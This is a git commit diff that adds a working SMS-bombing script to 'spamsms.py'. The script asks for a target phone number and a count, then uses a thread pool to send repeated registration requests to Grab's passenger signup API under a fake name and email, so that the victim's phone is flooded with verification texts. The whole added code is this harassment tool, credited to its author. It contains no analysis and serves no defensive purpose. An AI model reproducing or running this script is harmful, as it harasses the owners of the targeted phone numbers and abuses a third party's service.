deaeda2cee98534a7f13ddeeafaf66bc5d819b40
wisnusaputra123 <52888512+wisnusaputra123@users.noreply.github.com>
2019-10-02 00:32:01 +0700

    Update spamsms.py

--- spamsms.py
+++ spamsms.py
@@ -23,4 +23,36 @@ def tik():
 
 
 def rog():
-        try:
+try:
+	os.system('clear')
+	print("""\033[1;32m
+   _  _     \033[1;36mSPAM SMS (GRAB) UNLIMITED\033[1;32m
+ _| || |_   \033[1;31mAuthor : Mr.4LD1\033[1;32m
+|_  ..  _|  \033[1;31mContact : 082231589330\033[1;32m
+|_      _|  \033[1;31mgithub : https://github.com/Mr4LD1\033[1;32m
+  |_||_| 
+""")
+	no = input("\033[1;37m[?] NOMOR (Pakai 62 Gan) =>\033[1;36m ")
+	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
+except KeyboardInterrupt:
+	print("\nKey interrupt")
+	exit()
+print()
+print("[*] RESULT:")
+def main(arg):
+	try:
+		idk=('phoneNumber')
+		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[+] SUKSES")
+		else:
+			print("\033[1;31m[-] GAGAL")
+	except: pass
+
+jobs = []
+for x in range(jum):
+    jobs.append(x)
+p=ThreadPool(5)
+p.map(main,jobs)
+print("done ^•^")
